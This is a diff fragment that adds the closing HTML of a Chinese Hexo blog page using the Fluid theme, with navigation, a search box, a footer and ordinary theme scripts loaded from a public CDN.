+                      <a href="/2023/08/24/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91upload-labs%E9%9D%B6%E5%9C%BA%20web%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="【ctf题目系列】upload-labs靶场 web 文件上传漏洞">
+                        <span class="hidden-mobile">【ctf题目系列】upload-labs靶场 web 文件上传漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
